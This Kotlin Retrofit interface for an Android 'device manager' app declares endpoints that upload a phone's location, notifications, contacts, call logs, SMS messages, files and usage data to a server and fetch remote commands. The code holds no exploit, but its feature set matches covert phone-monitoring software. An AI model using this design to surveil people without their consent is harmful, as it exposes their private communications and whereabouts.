package com.devicemanager.data.remote

import com.devicemanager.data.remote.model.*
import okhttp3.MultipartBody
import okhttp3.RequestBody
import retrofit2.Response
import retrofit2.http.*

/**
 * Retrofit API interface defining all backend endpoints.
 *
 * All device requests use the header X-Device-Token: <token>, which is
 * injected by the OkHttp interceptor configured in DeviceManagerApp.
 */
interface ApiService {

    // ── Device Registration ──────────────────────────────────────────

    @POST("/api/devices/register")
    suspend fun registerDevice(
        @Body request: RegisterRequest
    ): Response<RegisterResponse>

    @POST("/api/auth/login")
    suspend fun login(
        @Body request: LoginRequest
    ): Response<LoginResponse>

    @POST("/api/devices/register-device")
    suspend fun registerDeviceToAccount(
        @Header("Authorization") authHeader: String,
        @Body request: RegisterDeviceRequest
    ): Response<RegisterDeviceResponse>

    // ── Telemetry ────────────────────────────────────────────────────

    @POST("/api/devices/{id}/telemetry")
    suspend fun sendTelemetry(
        @Path("id") deviceId: String,
        @Body request: TelemetryRequest
    ): Response<TelemetryResponse>

    // ── Location ─────────────────────────────────────────────────────

    @POST("/api/devices/{id}/location")
    suspend fun sendLocation(
        @Path("id") deviceId: String,
        @Body request: LocationRequest
    ): Response<LocationResponse>

    // ── Notifications ────────────────────────────────────────────────

    @POST("/api/devices/{id}/notifications")
    suspend fun sendNotification(
        @Path("id") deviceId: String,
        @Body request: NotificationRequest
    ): Response<NotificationResponse>

    // ── Usage Stats ──────────────────────────────────────────────────

    @POST("/api/devices/{id}/usage")
    suspend fun sendUsageStats(
        @Path("id") deviceId: String,
        @Body request: UsageRequest
    ): Response<UsageResponse>

    // ── Contacts ─────────────────────────────────────────────────────

    @POST("/api/devices/{id}/contacts")
    suspend fun syncContacts(
        @Path("id") deviceId: String,
        @Body request: ContactsSyncRequest
    ): Response<ContactsSyncResponse>

    // ── Call Log ─────────────────────────────────────────────────────

    @POST("/api/devices/{id}/calls")
    suspend fun syncCalls(
        @Path("id") deviceId: String,
        @Body request: CallsSyncRequest
    ): Response<CallsSyncResponse>

    // ── SMS ──────────────────────────────────────────────────────────

    @POST("/api/devices/{id}/sms")
    suspend fun syncSms(
        @Path("id") deviceId: String,
        @Body request: SmsSyncRequest
    ): Response<SmsSyncResponse>

    // ── Files ────────────────────────────────────────────────────────

    @POST("/api/devices/{id}/files")
    suspend fun syncFiles(
        @Path("id") deviceId: String,
        @Body request: FilesSyncRequest
    ): Response<FilesSyncResponse>

    // ── File Upload (multipart) ──────────────────────────────────────

    @Multipart
    @POST("/api/devices/{id}/upload-file")
    suspend fun uploadFile(
        @Path("id") deviceId: String,
        @Part("file_type") fileType: RequestBody,
        @Part file: MultipartBody.Part
    ): Response<FileUploadResponse>

    // ── Commands ─────────────────────────────────────────────────────

    @GET("/api/devices/{id}/commands/pending")
    suspend fun getPendingCommands(
        @Path("id") deviceId: String
    ): Response<PendingCommandsResponse>

    @PUT("/api/commands/{id}/status")
    suspend fun updateCommandStatus(
        @Path("id") commandId: String,
        @Body request: CommandStatusRequest
    ): Response<ApiResponse<Any>>

    // ── Permissions ──────────────────────────────────────────────────

    @PUT("/api/devices/{id}/permissions")
    suspend fun updatePermissions(
        @Path("id") deviceId: String,
        @Body request: PermissionsRequest
    ): Response<PermissionsResponse>

    // ── Chunked File Transfers ───────────────────────────────────────

    @POST("/api/transfers/init")
    suspend fun initTransfer(
        @Body request: TransferInitRequest
    ): Response<TransferInitResponse>

    @POST("/api/transfers/{id}/chunk")
    suspend fun uploadChunk(
        @Path("id") transferId: String,
        @Body request: ChunkUploadRequest
    ): Response<ChunkUploadResponse>

    @POST("/api/transfers/{id}/complete")
    suspend fun completeTransfer(
        @Path("id") transferId: String
    ): Response<TransferCompleteResponse>

    @GET("/api/transfers/{id}/status")
    suspend fun getTransferStatus(
        @Path("id") transferId: String
    ): Response<TransferStatusResponse>

    // ── Snapshots ────────────────────────────────────────────────────

    @POST("/api/snapshots")
    suspend fun createSnapshot(
        @Body request: SnapshotCreateRequest
    ): Response<SnapshotResponse>
}

/**
 * Request body for creating a snapshot.
 */
data class SnapshotCreateRequest(
    @com.google.gson.annotations.SerializedName("snapshot_data") val snapshotData: com.devicemanager.data.remote.model.SnapshotData
)
